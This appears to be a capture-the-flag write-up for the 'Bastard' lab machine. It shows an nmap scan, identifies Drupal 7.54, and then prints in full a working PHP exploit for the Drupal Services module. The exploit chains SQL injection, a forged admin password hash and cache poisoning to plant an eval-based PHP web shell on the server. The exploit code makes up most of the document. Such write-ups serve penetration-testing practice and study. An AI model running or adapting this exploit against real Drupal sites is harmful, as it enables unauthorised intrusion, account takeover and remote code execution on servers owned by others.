---
layout: post
title: Bastard
categories:
  - Writeup
---

<br>OS Windows
<br>IP: 10.10.10.9
<br>Machine Author: ch4p

**Nmap**:-
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nmap -sS -sV -O 10.10.10.9

<br>Starting Nmap 7.50 ( https://nmap.org ) at 2017-12-20 21:59 EST
<br>Nmap scan report for 10.10.10.9
<br>Host is up (0.15s latency).
<br>Not shown: 997 filtered ports
<br>PORT      STATE SERVICE VERSION
<br><font color="BB69EC">80/tcp</font>    open  http    Microsoft IIS httpd 7.5
<br>|_http-generator: Drupal 7 (http://drupal.org)
<br>| http-methods: 
<br>|_  Potentially risky methods: TRACE
<br>| http-robots.txt: 36 disallowed entries (15 shown)
<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
<br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
<br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
<br>|_/LICENSE.txt /MAINTAINERS.txt
<br>|_http-server-header: Microsoft-IIS/7.5
<br>|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
<br><font color="BB69EC">135/tcp</font>   open  msrpc   Microsoft Windows RPC
<br><font color="BB69EC">49154/tcp</font> open  msrpc   Microsoft Windows RPC
<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
<br>Device type: general purpose|phone|specialized
<br>Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|8.1|7|Vista|2012 (92%)
<br>OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 <br>cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 <br>cpe:/o:microsoft:windows_server_2012
<br>Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2008 <br>R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft <br>Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), <br>Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 <br>SP1, or Windows 7 (91%)
<br>No exact OS matches for host (test conditions non-ideal).
<br>Network Distance: 2 hops
<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<br>TRACEROUTE (using port 80/tcp)
<br>HOP RTT       ADDRESS
<br>1   139.01 ms 10.10.14.1
<br>2   139.18 ms 10.10.10.9

<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<br>Nmap done: 1 IP address (1 host up) scanned in 86.43 seconds

<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>
</div>
</font>

<br>**Web**:- Drupal Service is running
![Drupal](https://teckk2.github.io/assets/images/Bastard/1-Bastard.JPG)
<br>and by checking /CHANGELOG.txt which we found in the nmap scan of robots.txt, we can see the version installed of drupal is 7.54
![version](https://teckk2.github.io/assets/images/Bastard/2-Bastard.JPG)
<br>For which there is a public exploit available [Drupal-Services-Module-rce](https://www.ambionics.io/blog/drupal-services-module-rce)
<br>Now download the exploit from the blog and edit the $url and $endpoint_path
![edit](https://teckk2.github.io/assets/images/Bastard/3-Bastard.JPG)
**Exploit**:-
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># cat exploit.php
<br>#!/usr/bin/php
<br><?php
<br># Drupal Services Module Remote Code Execution Exploit
<br># https://www.ambionics.io/blog/drupal-services-module-rce
<br># cf
<br>#
<br># Three stages:
<br># 1. Use the SQL Injection to get the contents of the cache for current endpoint
<br>#    along with admin credentials and hash
<br># 2. Alter the cache to allow us to write a file and do so
<br># 3. Restore the cache
<br># </p>

<p># Initialization</p>

<p>error_reporting(E_ALL);</p>

<p>define('QID', 'anything');
<br>define('TYPE_PHP', 'application/vnd.php.serialized');
<br>define('TYPE_JSON', 'application/json');
<br>define('CONTROLLER', 'user');
<br>define('ACTION', 'login');</p>

<p>$url = 'http://10.10.10.9';
<br>$endpoint_path = '/rest';
<br>$endpoint = 'rest_endpoint';</p>

<p>$file = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;'filename' => 'dixuSOspsOUU.php',
<br>&nbsp;&nbsp;&nbsp;&nbsp;'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
<br>];</p>

<p>$browser = new Browser($url . $endpoint_path);</p>


<p># Stage 1: SQL Injection</p>

</p>class DatabaseCondition
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $conditions = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"#conjunction" => "AND"
<br>&nbsp;&nbsp;&nbsp;&nbsp;];
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $arguments = [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $changed = false;
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $queryPlaceholderIdentifier = null;
<br>&nbsp;&nbsp;&nbsp;&nbsp;public $stringVersion = null;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;public function __construct($stringVersion=null)
<br>&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->stringVersion = $stringVersion;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!isset($stringVersion))
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->changed = true;
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->stringVersion = null;
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>}</p>

<p>class SelectQueryExtender {
<br>&nbsp;&nbsp;&nbsp;&nbsp;# Contains a DatabaseCondition object instead of a SelectQueryInterface
<br>&nbsp;&nbsp;&nbsp;&nbsp;# so that $query->compile() exists and (string) $query is controlled by us.
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $query = null;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;protected $uniqueIdentifier = QID;
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $connection;
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $placeholder = 0;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;public function __construct($sql)
<br>&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;$this->query = new DatabaseCondition($sql);
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>}</p>

<p>$cache_id = "services:$endpoint:resources";
<br>$sql_cache = "SELECT data FROM {cache} WHERE cid='$cache_id'";
<br>$password_hash = '$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd';</p>

<p># Take first user but with a custom password
<br># Store the original password hash in signature_format, and endpoint cache
<br># in signature
<br>$query = 
<br>&nbsp;&nbsp;&nbsp;&nbsp;"0x3a) UNION SELECT ux.uid AS uid, " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"ux.name AS name, '$password_hash' AS pass, " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"ux.pass AS signature_format, ux.created AS created, " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"ux.access AS access, ux.login AS login, ux.status AS status, " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"ux.timezone AS timezone, ux.language AS language, ux.picture " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"AS picture, ux.init AS init, ux.data AS data FROM {users} ux " .
<br>&nbsp;&nbsp;&nbsp;&nbsp;"WHERE ux.uid<>(0"
<br>;</p>

<p>$query = new SelectQueryExtender($query);
<br>$data = ['username' => $query, 'password' => 'ouvreboite'];
<br>$data = serialize($data);</p>

<p>$json = $browser->post(TYPE_PHP, $data);</p>

<p># If this worked, the rest will as well
<br>if(!isset($json->user))
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;print_r($json);
<br>&nbsp;&nbsp;&nbsp;&nbsp;e("Failed to login with fake password");
<br>}</p>

<p># Store session and user data</p>

<p>$session = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;'session_name' => $json->session_name,
<br>&nbsp;&nbsp;&nbsp;&nbsp;'session_id' => $json->sessid,
<br>&nbsp;&nbsp;&nbsp;&nbsp;'token' => $json->token
<br>];
<br>store('session', $session);</p>

<p>$user = $json->user;</p>

<p># Unserialize the cached value
<br># Note: Drupal websites admins, this is your opportunity to fight back :)
<br>$cache = unserialize($user->signature);</p>

<p># Reassign fields
<br>$user->pass = $user->signature_format;
<br>unset($user->signature);
<br>unset($user->signature_format);</p>

<p>store('user', $user);</p>

<p>if($cache === false)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;e("Unable to obtains endpoint's cache value");
<br>}</p>

<p>x("Cache contains " . sizeof($cache) . " entries");</p>

<p># Stage 2: Change endpoint's behaviour to write a shell</p>

<p>class DrupalCacheArray
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;# Cache ID
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $cid = "services:endpoint_name:resources";
<br>&nbsp;&nbsp;&nbsp;&nbsp;# Name of the table to fetch data from.
<br>&nbsp;&nbsp;&nbsp;&nbsp;# Can also be used to SQL inject in DrupalDatabaseCache::getMultiple()
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $bin = 'cache';
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $keysToPersist = [];
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $storage = [];</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;function __construct($storage, $endpoint, $controller, $action) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;$settings = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;'services' => ['resource_api_version' => '1.0']
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->cid = "services:$endpoint:resources";</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# If no endpoint is given, just reset the original values
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(isset($controller))
<br>&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$storage[$controller]['actions'][$action] = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'help' => 'Writes data to a file',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Callback function
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'callback' => 'file_put_contents',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# This one does not accept "true" as Drupal does,
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# so we just go for a tautology
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'access callback' => 'is_string',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'access arguments' => ['a string'],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Arguments given through POST
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'args' => [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0 => [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'name' => 'filename',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'type' => 'string',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'description' => 'Path to the file',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'source' => ['data' => 'filename'],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'optional' => false,
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 => [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'name' => 'data',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'type' => 'string',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'description' => 'The data to write',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'source' => ['data' => 'data'],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'optional' => false,
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'file' => [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'type' => 'inc',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'module' => 'services',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'name' => 'resources/user_resource',
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'endpoint' => $settings
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$storage[$controller]['endpoint']['actions'] += [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$action => [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'enabled' => 1,
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'settings' => $settings
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->storage = $storage;
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->keysToPersist = array_fill_keys(array_keys($storage), true);
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>}</p>

<p>class ThemeRegistry Extends DrupalCacheArray {
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $persistable;
<br>&nbsp;&nbsp;&nbsp;&nbsp;protected $completeRegistry;
<br>}</p>

<p>cache_poison($endpoint, $cache);</p>

<p># Write the file
<br>$json = (array) $browser->post(TYPE_JSON, json_encode($file));</p>


<p># Stage 3: Restore endpoint's behaviour</p>

<p>cache_reset($endpoint, $cache);</p>

<p>if(!(isset($json[0]) && $json[0] === strlen($file['data'])))
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;e("Failed to write file.");
<br>}</p>

<p>$file_url = $url . '/' . $file['filename'];
<br>x("File written: $file_url");</p>


<p># HTTP Browser</p>

<p>class Browser
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;private $url;
<br>&nbsp;&nbsp;&nbsp;&nbsp;private $controller = CONTROLLER;
<br>&nbsp;&nbsp;&nbsp;&nbsp;private $action = ACTION;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;function __construct($url)
<br>&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this->url = $url;
<br>&nbsp;&nbsp;&nbsp;&nbsp;}</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;function post($type, $data)
<br>&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$headers = [
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Accept: " . TYPE_JSON,
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Content-Type: $type",
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Content-Length: " . strlen($data)
<br>&nbsp;&nbsp;&nbsp;&nbsp;];
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url = $this->url . '/' . $this->controller . '/' . $this->action;</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$s = curl_init(); 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_URL, $url);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_HTTPHEADER, $headers);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_POST, 1);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_POSTFIELDS, $data);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output = curl_exec($s);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error = curl_error($s);
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($s);</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($error)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e("cURL: $error");
<br>&nbsp;&nbsp;&nbsp;&nbsp;}</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;return json_decode($output);
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>}</p>

<p># Cache</p>

<p>function cache_poison($endpoint, $cache)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;$tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION);
<br>&nbsp;&nbsp;&nbsp;&nbsp;cache_edit($tr);
<br>}</p>

<p>function cache_reset($endpoint, $cache)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;$tr = new ThemeRegistry($cache, $endpoint, null, null);
<br>&nbsp;&nbsp;&nbsp;&nbsp;cache_edit($tr);
<br>}</p>

<p>function cache_edit($tr)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;global $browser;
<br>&nbsp;&nbsp;&nbsp;&nbsp;$data = serialize([$tr]);
<br>&nbsp;&nbsp;&nbsp;&nbsp;$json = $browser->post(TYPE_PHP, $data);
<br>}</p>

<p># Utils</p>

<p>function x($message)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;print("$message\n");
<br>}</p>

<p>function e($message)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;x($message);
<br>&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
<br>}</p>

<p>function store($name, $data)
<br>{
<br>&nbsp;&nbsp;&nbsp;&nbsp;$filename = "$name.json";
<br>&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
<br>&nbsp;&nbsp;&nbsp;&nbsp;x("Stored $name information in $filename");
<br>}</p>
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>
</div>
</font>
